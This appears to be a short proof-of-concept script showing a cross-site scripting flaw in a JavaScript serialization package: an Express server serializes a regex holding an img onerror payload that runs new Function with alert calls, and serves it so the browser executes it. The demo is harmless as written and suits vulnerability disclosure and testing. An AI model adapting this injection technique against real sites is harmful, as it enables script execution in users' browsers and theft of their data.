const serialize = require("../package")
const express = require('express')
const app = express()
const port = 3000


// this more complex payload proves that it is possible to execute an arbitrary amount of instructions
// let payload = /<img src=0 onerror="new Function('alert(`arbitrary function executed`);alert(`several instructions executed`);').call()">/;

let payload = /<img src=0 onerror="new Function('alert(`arbitrary function executed`);').call()">/;
let s = serialize(payload);

app.get('/', (req, res) => {
      res.send(s)
})

app.listen(port, () => {});

